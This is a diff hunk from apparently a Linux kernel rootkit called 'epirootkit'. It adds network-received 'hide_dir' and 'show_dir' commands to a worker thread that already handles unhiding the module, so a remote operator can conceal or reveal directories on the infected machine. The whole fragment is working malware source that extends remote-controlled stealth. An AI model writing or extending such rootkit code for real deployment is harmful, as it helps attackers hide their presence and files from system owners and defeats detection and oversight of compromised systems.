@@ -193,7 +193,23 @@ int network_worker(void *data)
 		} else if (strncmp(recv_buffer, "unhide_module", 13) == 0) {
 			pr_info("epirootkit: network_worker: unhiding module\n");
 			unhide_module();
-		}
+		} else if (strncmp(recv_buffer, "hide_dir",8) == 0) {
+			char *command = recv_buffer + 9;
+			command[strcspn(command, "\n")] = '\0';
+			if (add_hidden_dir(command) < 0) {
+				pr_err("epirootkit: network_worker: failed to hide directory\n");
+			} else {
+				pr_info("epirootkit: network_worker: directory %s hidden\n", recv_buffer + 9);
+			}
+		} else if (strncmp(recv_buffer, "show_dir", 8) == 0) {
+			char *command = recv_buffer + 9;
+			command[strcspn(command, "\n")] = '\0';
+			if (remove_hidden_dir(command) < 0) {
+				pr_err("epirootkit: network_worker: failed to unhide directory\n");
+			} else {
+				pr_info("epirootkit: network_worker: directory %s unhidden\n", recv_buffer + 9);
+			}
+		} 
 	}
 
 	// Final cleanup before thread exits
